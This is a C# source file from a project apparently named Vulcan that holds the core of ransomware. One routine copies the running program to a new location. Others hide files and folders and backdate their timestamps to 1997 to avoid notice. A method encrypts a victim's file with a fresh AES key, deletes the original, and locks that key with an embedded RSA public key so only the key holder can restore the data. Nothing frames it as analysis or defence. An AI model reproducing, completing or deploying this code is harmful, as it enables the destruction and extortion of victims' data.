using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Reflection;
using System.IO;
using System.Security.Cryptography;
using System.Xml.Serialization;

namespace Vulcan.Core
{
    public static class FileHelper
    {
        public static void CreateDirectory(string dir)
        {
            if (!Directory.Exists(dir))
            {
                DirectoryInfo info = Directory.CreateDirectory(dir);
                info.Attributes |= FileAttributes.Hidden;
                info.Attributes &= ~FileAttributes.ReadOnly;
                info.CreationTime = new DateTime(1997, 1, 2, 2, 0, 0, 0, System.Globalization.Calendar.CurrentEra);
                info.LastAccessTime = new DateTime(1997, 1, 2, 2, 0, 0, 0, System.Globalization.Calendar.CurrentEra);
                info.LastAccessTimeUtc = new DateTime(1997, 1, 2, 2, 0, 0, 0, System.Globalization.Calendar.CurrentEra);
                info.LastWriteTime = new DateTime(1997, 1, 2, 2, 0, 0, 0, System.Globalization.Calendar.CurrentEra);
                info.LastWriteTimeUtc = new DateTime(1997, 1, 2, 2, 0, 0, 0, System.Globalization.Calendar.CurrentEra);
                info.Create();
            }
        }

        public static void DropCopy(string dest)
        {
            File.Copy(Assembly.GetEntryAssembly().Location, dest, true);

            FileHelper.Touch(dest);
        }

        public static void Touch(string file)
        {
            File.SetAttributes(file, FileAttributes.Hidden);
            File.SetCreationTime(file, new DateTime(1997, 1, 2, 2, 0, 0, 0, System.Globalization.Calendar.CurrentEra));
            File.SetCreationTimeUtc(file, new DateTime(1997, 1, 2, 2, 0, 0, 0, System.Globalization.Calendar.CurrentEra));
            File.SetLastAccessTime(file, new DateTime(1997, 1, 2, 2, 0, 0, 0, System.Globalization.Calendar.CurrentEra));
            File.SetLastAccessTimeUtc(file, new DateTime(1997, 1, 2, 2, 0, 0, 0, System.Globalization.Calendar.CurrentEra));
            File.SetLastWriteTime(file, new DateTime(1997, 1, 2, 2, 0, 0, 0, System.Globalization.Calendar.CurrentEra));
            File.SetLastWriteTimeUtc(file, new DateTime(1997, 1, 2, 2, 0, 0, 0, System.Globalization.Calendar.CurrentEra));
        }

        public static void EncryptRSA(string file)
        {

            string iv;
            string key;


            using (FileStream fileCrypt = new FileStream(file + ".aes", FileMode.Create))
            {
                using (AesManaged encrypt = new AesManaged())
                {
                    encrypt.GenerateIV();
                    encrypt.GenerateKey();
                    key = Convert.ToBase64String(encrypt.Key);
                    iv = Convert.ToBase64String(encrypt.IV);
                    using (CryptoStream cs = new CryptoStream(fileCrypt, encrypt.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        using (FileStream fileInput = new FileStream(file, FileMode.Open))
                        {
                            encrypt.KeySize = 256;
                            encrypt.BlockSize = 128;
                            int data;
                            while ((data = fileInput.ReadByte()) != -1)
                                cs.WriteByte((byte)data);
                        }
                    }
                }
            }

            File.Delete(file);
            File.Move(file + ".aes", file);

            string akey = String.Format("{0}\n{1}", iv, key);

            RSAParameters publicKey;

            StringReader sr = new System.IO.StringReader(Vulcan.Core.Properties.Resources.PublicRSAKey);

            var xs = new System.Xml.Serialization.XmlSerializer(typeof(RSAParameters));

            publicKey = (RSAParameters)xs.Deserialize(sr);


            byte[] dat = Encoding.ASCII.GetBytes(akey);

            using (RSACryptoServiceProvider csp = new RSACryptoServiceProvider())
            {
                csp.ImportParameters(publicKey);
                File.WriteAllBytes(file + ".key", csp.Encrypt(dat, true));
            }


        }
    }
}
